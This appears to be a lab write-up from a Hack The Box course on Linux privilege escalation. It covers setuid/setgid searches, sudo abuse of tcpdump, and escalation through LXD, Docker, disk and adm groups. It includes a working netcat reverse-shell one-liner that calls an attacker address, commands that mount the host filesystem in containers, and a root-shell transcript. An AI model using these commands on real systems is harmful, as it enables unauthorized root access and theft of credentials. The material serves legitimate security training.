# 🛩️ Permissions-based Privilege Escalation

## Special Permissions

The `Set User ID upon Execution` (`setuid`) permission can allow a user to execute a program or script with the permissions of another user, typically with elevated privileges

```shell-session
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```

The Set-Group-ID (setgid) permission is another special permission that allows us to run binaries as if we were part of the group that created them.

```
 find / -uid 0 -perm -6000 -type f 2>/dev/null
 find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
```

For this type of privesc it's good to know the [GTFOBins](https://gtfobins.github.io/) project is a curated list of binaries and scripts that can be used by an attacker to bypass security restrictions.

## Sudo Rights Abuse

Sudo privileges can be granted to an account, permitting the account to run certain commands in the context of the root (or another account) without having to change users or grant excessive privileges.\
When landing on a system, we should always check to see if the current user has any sudo privileges by typing `sudo -l`

```shell-session
htb_student@NIX02:~$ sudo -l
<SNIP>
(root) NOPASSWD: /usr/sbin/tcpdump
```

&#x20;if the sudoers file is edited to grant a user the right to run a command such as `tcpdump` per the following entry in the sudoers file: `(ALL) NOPASSWD: /usr/sbin/tcpdump` an attacker could leverage this to take advantage of a the **postrotate-command** option.

```shell-session
htb_student@NIX02:~$ man tcpdump
<SNIP> 
-z postrorate-command   
```

By specifying the `-z` flag, an attacker could use `tcpdump` to execute a shell script, gain a reverse shell as the root user or run other privileged commands. Let's  create the shell script `.test` containing a reverse shell and execute it ->

```shell-session
sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
```

and the content of the .test file would be our reverse shell ->

```shell-session
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 443 >/tmp/f
```

Now we can start our listener on our attackbox ->

```shell-session
nc -lnvp 443
```

&#x20;and run `tcpdump` as root with the `postrotate-command`.

```shell-session
sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
```

we sould get our shell back pretty quickly:

```shell-session
ElFelixi0@htb[/htb]$ nc -lnvp 443

listening on [any] 443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.2.12] 38938
bash: cannot set terminal process group (10797): Inappropriate ioctl for device
bash: no job control in this shell

root@NIX02:~# id && hostname               
id && hostname
uid=0(root) gid=0(root) groups=0(root)
NIX02
```

## Privileged Groups

#### LXC / LXD

LXD is similar to Docker and is Ubuntu's container manager. Upon installation, all users are added to the LXD group. Membership of this group can be used to escalate privileges by creating an LXD container

&#x20;this [post](https://www.digitalocean.com/community/tutorials/how-to-set-up-and-use-lxd-on-ubuntu-16-04) has more information on each step.

We can confirm we're in the group with the id command ->

```shell-session
devops@NIX02:~$ id
uid=1009(devops) gid=1009(devops) groups=1009(devops),110(lxd)
```

Unzip the Alpine image.

```shell-session
unzip alpine.zip 
```

Start the LXD initialization process.

```shell-session
lxd init
```

Import the local image.

```shell-session
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
```

Start a privileged container with the `security.privileged` set to `true` to run the container without a UID mapping, making the root user in the container the same as the root user on the host.

```shell-session
lxc init alpine r00t -c security.privileged=true
```

Mount the host file system.

```shell-session
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
```

Finally, spawn a shell inside the container instance.

```shell-session
devops@NIX02:~$ lxc start r00t
devops@NIX02:~/64-bit Alpine$ lxc exec r00t /bin/sh

~ # id
uid=0(root) gid=0(root)
~ # 
```

### Docker

Placing a user in the docker group is essentially equivalent to root level access to the file system without requiring a password. Members of the docker group can spawn new docker containers. One example would be running the command `docker run -v /root:/mnt -it ubuntu`. This command create a new Docker instance with the /root directory on the host file system mounted as a volume. Once the container is started we are able to browse to the mounted directory and retrieve or add SSH keys for the root user. This could be done for other directories such as `/etc` which could be used to retrieve the contents of the `/etc/shadow` file for offline password cracking or adding a privileged user.

### Disk

Users within the disk group have full access to any devices contained within `/dev`, such as `/dev/sda1`, which is typically the main device used by the operating system. An attacker with these privileges can use `debugfs` to access the entire file system with root level privileges.

### ADM

Members of the adm group are able to read all logs stored in `/var/log`. This does not directly grant root access, but could be leveraged to gather sensitive data stored in log files or enumerate user actions and running cron jobs.

_**Use the privileged group rights of the secaudit user to locate a flag.**_

<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

Went and found the /var/log file and looked at every adm group until i found one log file with the flag in it
